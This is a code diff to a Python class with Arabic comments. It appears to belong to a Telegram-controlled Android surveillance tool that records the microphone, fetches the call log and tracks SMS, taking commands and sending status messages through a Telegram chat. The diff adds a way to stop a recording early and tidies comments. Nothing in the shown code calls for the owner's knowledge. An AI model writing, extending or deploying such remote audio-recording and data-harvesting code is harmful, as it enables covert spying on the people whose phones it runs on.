@@ -72,7 +72,7 @@ class C:
             "temp_file_age": 3600,
             "pending_file_age": 86400,
             "audio_duration": 10,
-            "min_audio_size": 5000,   # 5KB كحد أدنى (تم رفعه من 100)
+            "min_audio_size": 5000,   # 5KB كحد أدنى
             "min_battery": 15,
             "enable_logging": True,
             "max_sms_count": 100,
@@ -245,12 +245,13 @@ class C:
             finally:
                 self._safe_remove(temp_path)
 
-    # ========== تسجيل صوتي (محسّن: رفع الحد الأدنى إلى 5KB) ==========
+    # ========== تسجيل صوتي (محسّن) ==========
     def _record_audio(self, duration=None):
         """
         تسجيل صوتي من الميكروفون.
         - duration: مدة التسجيل بالثواني (افتراضي من الإعدادات)
         - يتحقق من أن حجم الملف لا يقل عن 5KB (5000 بايت)
+        - يدعم الإيقاف المبكر عبر self._stop_recording
         """
         if not JNI:
             logging.error("JNI not available")
@@ -329,6 +330,12 @@ class C:
 
             with self._mic_lock:
                 self.mic_busy = False
+
+    # ========== دالة لإيقاف التسجيل ==========
+    def stop_recording(self):
+        """طلب إيقاف التسجيل الحالي"""
+        self._stop_recording = True
+        logging.info("Recording stop requested")
 
     # ========== جلب سجل المكالمات ==========
     def _call_log(self, limit=None):
@@ -573,6 +580,8 @@ class C:
                 tg._api("sendMessage", {"chat_id": cid, "text": "⏳ التسجيل قيد التنفيذ"})
                 return
 
+            # إعادة تعيين علامة الإيقاف قبل بدء التسجيل
+            self._stop_recording = False
             duration = self._config.get("audio_duration", 10)
             tg._api("sendMessage", {"chat_id": cid, "text": f"🎤 جاري التسجيل لمدة {duration} ثوانٍ..."})
 
